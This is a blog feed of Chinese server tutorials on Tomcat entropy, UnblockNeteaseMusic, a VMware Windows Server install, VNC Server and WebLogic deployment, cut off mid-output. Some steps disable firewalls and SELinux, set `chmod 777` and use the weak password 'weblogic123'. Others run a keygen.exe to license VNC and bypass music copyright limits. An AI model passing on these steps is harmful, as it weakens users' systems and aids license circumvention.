<p><img src= "/img/loading.gif" data-src="/2019/03/01/Tomcat%E7%86%B5%E6%B1%A0%E8%80%97%E5%B0%BD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200821103909764.png" alt="image-20200821103909764"></p>
<p><strong>3.</strong>启动后发现日志卡在这里启动事件卡在这里十几分钟</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/01/Tomcat%E7%86%B5%E6%B1%A0%E8%80%97%E5%B0%BD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200821103922482.png" alt="image-20200821103922482"></p>
<p><strong>4.</strong> 原因：熵池中随机数耗尽，随机数产生器会手机来自设备驱动器和其它源的环境噪声数据，并放入熵池中。产生器会评估熵池中的噪声数据的数量。当熵池为空时，这个噪声数据的收集是比较花时间的。这就意味着，Tomcat在生产环境中使用熵池时，会被阻塞较长的时间。</p>
<p><strong>解决：修改java环境配置采用非阻塞的熵源</strong></p>
<p>在JVM环境中解决</p>
<p> 打开$JAVA_PATH/jre/lib/security/java.security这个文件，找到下面的内容：</p>
<p>securerandom.source=file:/dev/urandom</p>
<p>替换成</p>
<p>securerandom.source=file:/dev/./urandom</p>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>熵池</tag>
      </tags>
  </entry>
  <entry>
    <title>使用UnblockNeteaseMusic播放网易云音乐客户端无版权歌曲</title>
    <url>/2018/11/03/UnblockNeteaseMusic%E6%92%AD%E6%94%BE%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%97%A0%E7%89%88%E6%9D%83%E6%AD%8C%E6%9B%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>linux下进行环境的准备和使用yum安装node和npm</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld &amp;&amp; setenforce 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install epel-release -y</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install nodejs  git -y</span></span><br></pre></td></tr></table></figure>

<p>下载解压并运行UnblockNeteaseMusic（请确保网络良好）</p>
<p>如果git失效或者速度太慢，可以使用百度云下载下来传到服务器上使用unzip解压，然后在进行如下操作即可，百度云盘链接如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1glJcN6GQlEZi887pjY05Ww </span><br><span class="line">提取码：ieuw </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/nondanee/UnblockNeteaseMusic.git &amp;&amp; <span class="built_in">cd</span> UnblockNeteaseMusic &amp;&amp; npm install -g forever &amp;&amp; forever start app.js -p 10010</span></span><br></pre></td></tr></table></figure>

<p>如果是云服务器需要在安全组放行对应的端口</p>
<p>开机自启脚本，服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/systemd/system/UnblockNeteaseMusic.service &lt;&lt;EOF</span><br><span class="line">[Unit]</span><br><span class="line">Description=UnblockNeteaseMusic</span><br><span class="line">After=network.target</span><br><span class="line">Wants=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">PIDFile=/var/run/UnblockNeteaseMusic.pid</span><br><span class="line">WorkingDirectory=/home/UnblockNeteaseMusic</span><br><span class="line">ExecStart=$(command -v node) app.js</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>这里可以自定义端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node app.js -p 端口号</span><br></pre></td></tr></table></figure>

<p>运行脚本并开机自启</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start UnblockNeteaseMusic &amp;&amp; systemctl enable UnblockNeteaseMusic</span><br></pre></td></tr></table></figure>

<p>网易云音乐PC端代理设置方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网易云客户端设置 &gt; 工具 &gt; 自定义代理 &gt; HTTP代理</span><br><span class="line">这里只需要填上你的服务器ip和端口，保存即可。</span><br></pre></td></tr></table></figure>

<p>其他平台如何使用</p>
<p><img src= "/img/loading.gif" data-src="/2018/11/03/UnblockNeteaseMusic%E6%92%AD%E6%94%BE%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%97%A0%E7%89%88%E6%9D%83%E6%AD%8C%E6%9B%B2/image-20200817194056137.png" alt="image-20200817194056137"></p>
]]></content>
      <categories>
        <category>UnblockNeteaseMusic</category>
      </categories>
      <tags>
        <tag>UnblockNeteaseMusic</tag>
        <tag>网易云音乐</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware安装windows server 2012 r2详细教程</title>
    <url>/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="VMware安装windows-server-2012-r2详细教程"><a href="#VMware安装windows-server-2012-r2详细教程" class="headerlink" title="VMware安装windows server 2012 r2详细教程"></a>VMware安装windows server 2012 r2详细教程</h1><p>VMware虚拟机安装Windows server 2012之前，要满足两个条件：</p>
<p>1、自己在本机上已经安装了“VMware Workstation Pro”这个软件（图标类似于这个，不同版本图标不太相同）；</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906174838197.png" alt="image-20200906174838197"></p>
<p>2、要有Windows server 2012 r2的镜像文件，以“iso”为后缀</p>
<p>下载链接：</p>
<p>链接：<a href="https://pan.baidu.com/s/1K_E39C3VgWCuMLb6RiVczw" target="_blank" rel="noopener">https://pan.baidu.com/s/1K_E39C3VgWCuMLb6RiVczw</a> 密码：tb52</p>
<p>满足上面两个条件之后，我们在虚拟机上进行Windows server 2012 r2的安装：</p>
<p>A、打开“VMware Workstation Pro”软件，依次选择【文件 | 新建虚拟机】，弹出“新建虚拟机”页面，如下图所示：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906174938246.png" alt="image-20200906174938246"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175007859.png" alt="image-20200906175007859"></p>
<p>B、点击【下一步】，进行镜像文件的选择，找到自己镜像文件所在的位置，然后选择，如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175020555.png" alt="image-20200906175020555"></p>
<p>C、选择镜像文件之后，点击【下一步】，进行安装信息的设置，设置用户名和密码，此处密钥信息不必填写，如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175032160.png" alt="image-20200906175032160"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175039720.png" alt="image-20200906175039720"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175046992.png" alt="image-20200906175046992"></p>
<p>D、设置完用户名和密码之后，点击【下一步】进行虚拟机名称和安装路径的设置，如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175100620.png" alt="image-20200906175100620"></p>
<p>E、进行虚拟机名称和安装路径设置后，接下来设置虚拟机的基本配置信息，对于Windows server 2012系统来说，相关的系统配置要求不太高，在此我们只需要设置以下几项就可以：磁盘大小、内存、处理器，具体的设置参数见下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175111475.png" alt="image-20200906175111475"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175118555.png" alt="image-20200906175118555"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175125716.png" alt="image-20200906175125716"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175132648.png" alt="image-20200906175132648"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175139165.png" alt="image-20200906175139165"></p>
<p>F、设置完磁盘大小、内存、处理器信息之后点击【关闭】按钮，会返回到新建虚拟机界面，此时我们对配置的信息进行核对，然后点击【完成】，进行虚拟机的安装（此过程全程自动化安装，不需要我们去做任何操作），如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175153779.png" alt="image-20200906175153779"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175201556.png" alt="image-20200906175201556"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175209004.png" alt="image-20200906175209004"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175215761.png" alt="image-20200906175215761"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175223689.png" alt="image-20200906175223689"></p>
<p>G、静等几分钟后安装过程结束，至此你的虚拟机会自动重启，直至出现以下界面，表明虚拟机安装成功啦，接下来我们就可以运用虚拟机进行相关的操作了：</p>
<p>注：刚进去可能会弹出一个框 叉掉即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/VMware%E5%AE%89%E8%A3%85Windows%20server%202012%20R2/image-20200906175237671.png" alt="image-20200906175237671"></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>VNC-Server使用教程</title>
    <url>/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>所用到的软件安装包都在以下链接里</p>
<p>链接：<a href="https://pan.baidu.com/s/1G0WDlcLXFyawM8842j9trA" target="_blank" rel="noopener">https://pan.baidu.com/s/1G0WDlcLXFyawM8842j9trA</a> </p>
<p>提取码：l7bo</p>
<ol>
<li>下载链接的VNC-Server安装包并安装完成</li>
<li>下载连接中的keygen.exe然后打开</li>
</ol>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193314842.png" alt="image-20200727193314842"></p>
<ol start="3">
<li>安装vnc完毕后打开进行如下图安装</li>
</ol>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193420272.png" alt="image-20200727193420272"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193424686.png" alt="image-20200727193424686"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193432066.png" alt="image-20200727193432066"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193438276.png" alt="image-20200727193438276"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193443557.png" alt="image-20200727193443557"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193447400.png" alt="image-20200727193447400"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193452888.png" alt="image-20200727193452888"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193457095.png" alt="image-20200727193457095"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193500899.png" alt="image-20200727193500899"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193505672.png" alt="image-20200727193505672"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193509718.png" alt="image-20200727193509718"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193515510.png" alt="image-20200727193515510"></p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193519435.png" alt="image-20200727193519435"></p>
<p>Win10关闭防火墙即可正常访问</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/VNC-Server%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20200727193530381.png" alt="image-20200727193530381"></p>
<p>然后就可以让其他人通过vnc-view进行访问了</p>
]]></content>
      <categories>
        <category>VNC使用教程</category>
      </categories>
      <tags>
        <tag>VNC-Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic介绍及部署</title>
    <url>/2019/03/22/Weblogic%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Weblogic介绍及部署"><a href="#Weblogic介绍及部署" class="headerlink" title="Weblogic介绍及部署"></a>Weblogic介绍及部署</h1><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>​        WebLogic是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。</p>
<p>​        WebLogic Server凭借其出色的群集技术，拥有处理关键Web应用系统问题所需的性能、可扩展性和高可用性。WebLogic Server既实现了网页群集，也实现了EJB组件 群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错 。无论是网页群集，还是组件群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。共享的客户机/服务器和数据库连接以及数据缓存和EJB都增强了性能表现。这是其它Web应用系统所不具备的。所以，在扩展性方面WebLogic是远远超越了Tomcat。</p>
<h1 id="weblogic搭建"><a href="#weblogic搭建" class="headerlink" title="weblogic搭建"></a>weblogic搭建</h1><p>注意：无法使用root用户进行安装，需要自行创建用户。</p>
<h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><p>centos7.4</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/22/Weblogic%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%83%A8%E7%BD%B2/image-20200821105337460.png" alt="image-20200821105337460"></p>
<p>下载weblogic安装包以及jdk安装包</p>
<p>weblogic官网地址：<a href="https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</a></p>
<p>jdk官网：<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></p>
<p>weblogic版本：fmw_12.2.1.4.0_wls_Disk1_1of1</p>
<p>jdk版本：jdk-8u211-linux-x64</p>
<h2 id="二、jdk安装"><a href="#二、jdk安装" class="headerlink" title="二、jdk安装"></a>二、jdk安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@weblogic1 ~]# tar xzf jdk-8u211-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;</span><br><span class="line">[root@weblogic1 ~]# cd &#x2F;usr&#x2F;local&#x2F;</span><br><span class="line">[root@weblogic1 local]# mv jdk1.8.0_211&#x2F; java</span><br><span class="line">设置环境变量:</span><br><span class="line">[root@weblogic1 local]# vim &#x2F;etc&#x2F;profile</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">export PATH&#x3D;$JAVA_HOME&#x2F;bin:$JAVA_HOME&#x2F;jre&#x2F;bin:$PATH</span><br><span class="line">[root@weblogic1 local]# source &#x2F;etc&#x2F;profile</span><br><span class="line">[root@weblogic1 local]# java -version</span><br><span class="line">java version &quot;1.8.0_211&quot;</span><br></pre></td></tr></table></figure>

<h2 id="三、安装weblogic"><a href="#三、安装weblogic" class="headerlink" title="三、安装weblogic"></a>三、安装weblogic</h2><h4 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h4><p>1、创建用户和组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># useradd  weblogic &#x2F;&#x2F;创建用户以及组</span><br><span class="line"></span><br><span class="line"># passwd weblogic &#x2F;&#x2F;修改用户密码</span><br></pre></td></tr></table></figure>



<h4 id="二、开始安装"><a href="#二、开始安装" class="headerlink" title="二、开始安装"></a>二、开始安装</h4><h5 id="1、创建ORACLE-HOME"><a href="#1、创建ORACLE-HOME" class="headerlink" title="1、创建ORACLE_HOME"></a>1、创建ORACLE_HOME</h5><p>使用root账户创建目录，并将所有权赋予weblogic</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mkdir -p &#x2F;weblogic&#x2F;bea</span><br><span class="line"></span><br><span class="line"># chown -R weblogic.weblogic &#x2F;weblogic</span><br><span class="line"></span><br><span class="line">#chmod 777 &#x2F;weblogic&#x2F;bea</span><br></pre></td></tr></table></figure>



<h5 id="2、创建目录，并将安装包复制到目录下"><a href="#2、创建目录，并将安装包复制到目录下" class="headerlink" title="2、创建目录，并将安装包复制到目录下"></a>2、创建目录，并将安装包复制到目录下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cp &#x2F;root&#x2F;fmw_12.2.1.3.0_wls.jar   &#x2F;home&#x2F;weblogic</span><br><span class="line"></span><br><span class="line"># su weblogic</span><br><span class="line"></span><br><span class="line"># cd</span><br></pre></td></tr></table></figure>

<h5 id="3、创建wls-rsp和oraInst-loc文件"><a href="#3、创建wls-rsp和oraInst-loc文件" class="headerlink" title="3、创建wls.rsp和oraInst.loc文件"></a>3、创建wls.rsp和oraInst.loc文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim wls.rsp</span><br></pre></td></tr></table></figure>

<p>wls.rsp文件内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ENGINE]</span><br><span class="line">#DO NOT CHANGE THIS.</span><br><span class="line">Response File Version&#x3D;1.0.0.0.0</span><br><span class="line"></span><br><span class="line">[GENERIC]</span><br><span class="line">#The oracle home location. This can be an existing Oracle Home or a new Oracle Home</span><br><span class="line"></span><br><span class="line">ORACLE_HOME&#x3D;&#x2F;weblogic&#x2F;bea</span><br><span class="line"></span><br><span class="line">#Set this variable value to the Installation Type selected. e.g. WebLogic Server, Coherence, Complete with Examples.</span><br><span class="line"></span><br><span class="line">INSTALL_TYPE&#x3D;WebLogic Server</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim  oraInst.loc</span><br></pre></td></tr></table></figure>

<p>oraInst.loc文件内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inventory_loc&#x3D;&#x2F;home&#x2F;weblogic&#x2F;oraInventory</span><br><span class="line"></span><br><span class="line">inst_group&#x3D;weblogic</span><br></pre></td></tr></table></figure>

<p><strong>注意：确保 oraInst.loc wls.rsp fmw_12.2.1.4.0_wls.jar 三个文件weblogic用户必须要有读写权限</strong></p>
<h5 id="4、开始安装"><a href="#4、开始安装" class="headerlink" title="4、开始安装"></a>4、开始安装</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># java -jar fmw_12.2.1.4.0_wls.jar -silent -responseFile &#x2F;home&#x2F;weblogic&#x2F;wls.rsp -invPtrLoc &#x2F;home&#x2F;weblogic&#x2F;oraInst.loc ORACLE_HOME&#x3D;&quot;&#x2F;weblogic&#x2F;bea&quot;</span><br></pre></td></tr></table></figure>

<h5 id="5、设置环境变量"><a href="#5、设置环境变量" class="headerlink" title="5、设置环境变量"></a>5、设置环境变量</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sh &#x2F;weblogic&#x2F;bea&#x2F;wlserver&#x2F;server&#x2F;bin&#x2F;setWLSEnv.sh   &#x2F;&#x2F;实际效果与之前jdk设置类似</span><br></pre></td></tr></table></figure>

<h5 id="6、创建Domain域名"><a href="#6、创建Domain域名" class="headerlink" title="6、创建Domain域名"></a>6、创建Domain域名</h5><p>有两种方式</p>
<p>​    方式1：通过命令行交互创建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[weblogic@localhost bea]$ cd &#x2F;weblogic&#x2F;bea&#x2F;wlserver&#x2F;common&#x2F;bin</span><br><span class="line">[weblogic@localhost bin]$ .&#x2F;wlst.sh </span><br><span class="line">WARNING: This is a deprecated script. Please invoke the wlst.sh script under oracle_common&#x2F;common&#x2F;bin.</span><br><span class="line"></span><br><span class="line">Initializing WebLogic Scripting Tool (WLST) ...</span><br><span class="line"></span><br><span class="line">Jython scans all the jar files it can find at first startup. Depending on the system, this process may take a few minutes to complete, and WLST may not return a prompt right away.</span><br><span class="line"></span><br><span class="line">Welcome to WebLogic Server Administration Scripting Shell</span><br><span class="line"></span><br><span class="line">Type help() for help on available commands</span><br><span class="line"></span><br><span class="line">wls:&#x2F;offline&gt; readTemplate(&#39;&#x2F;weblogic&#x2F;bea&#x2F;wlserver&#x2F;common&#x2F;templates&#x2F;wls&#x2F;wls.jar&#39;)</span><br><span class="line">WARNING: The readTemplate is deprecated. Use selectTemplate followed by loadTemplates in place of readTemplate.</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&gt;cd(&#39;Servers&#x2F;AdminServer&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Server&#x2F;AdminServer&gt;set(&#39;ListenAddress&#39;,&#39;&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Server&#x2F;AdminServer&gt;set(&#39;ListenPort&#39;,7001)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Server&#x2F;AdminServer&gt;cd(&#39;..&#x2F;..&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&gt;cd(&#39;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&gt;cmo.setPassword(&#39;weblogic123&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&gt;setOption(&#39;OverwriteDomain&#39;,&#39;true&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&gt;writeDomain(&#39;&#x2F;weblogic&#x2F;bea&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#39;)</span><br><span class="line">wls:&#x2F;offline&#x2F;base_domain&#x2F;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&gt;closeTemplate()</span><br><span class="line">wls:&#x2F;offline&gt;exit()</span><br><span class="line"></span><br><span class="line">Exiting WebLogic Scripting Tool.</span><br></pre></td></tr></table></figure>

<p>​    方式2：通过py脚本来创建</p>
<p>创建create_domains.py,添加内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readTemplate(&#39;&#x2F;weblogic&#x2F;bea&#x2F;wlserver&#x2F;common&#x2F;templates&#x2F;wls&#x2F;wls.jar&#39;)</span><br><span class="line">cd(&#39;Servers&#x2F;AdminServer&#39;)</span><br><span class="line">set(&#39;ListenAddress&#39;,&#39;ip地址&#39;)</span><br><span class="line">set(&#39;ListenPort&#39;, 7001)cd(&#39;..&#x2F;..&#39;)</span><br><span class="line">cd(&#39;&#x2F;Security&#x2F;base_domain&#x2F;User&#x2F;weblogic&#39;)</span><br><span class="line">cmo.setPassword(&#39;weblogic123&#39;)</span><br><span class="line">setOption(&#39;OverwriteDomain&#39;, &#39;true&#39;)</span><br><span class="line">setOption(&#39;ServerStartMode&#39;, &#39;prod&#39;)</span><br><span class="line">writeDomain(&#39;&#x2F;weblogic&#x2F;bea&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#39;)</span><br><span class="line">closeTemplate()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行安装 .&#x2F;wlst.sh  .&#x2F;create_domains.py</span><br></pre></td></tr></table></figure>

<h5 id="7、启动weblogic服务"><a href="#7、启动weblogic服务" class="headerlink" title="7、启动weblogic服务"></a>7、启动weblogic服务</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[weblogic@localhost bin]$ cd &#x2F;weblogic&#x2F;bea&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;bin&#x2F;</span><br><span class="line">[weblogic@localhost bin]$ .&#x2F;startWebLogic.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA Memory arguments: -Xms256m -Xmx512m -XX:CompileThreshold&#x3D;8000</span><br><span class="line">.</span><br><span class="line">CLASSPATH&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;lib&#x2F;tools.jar:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;server&#x2F;lib&#x2F;weblogic.jar:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;..&#x2F;oracle_common&#x2F;modules&#x2F;thirdparty&#x2F;ant-contrib-1.0b3.jar:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;modules&#x2F;features&#x2F;oracle.wls.common.nodemanager.jar::&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;common&#x2F;derby&#x2F;lib&#x2F;derbynet.jar:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;common&#x2F;derby&#x2F;lib&#x2F;derbyclient.jar:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;common&#x2F;derby&#x2F;lib&#x2F;derby.jar:.:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;lib:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;jre&#x2F;lib</span><br><span class="line">.</span><br><span 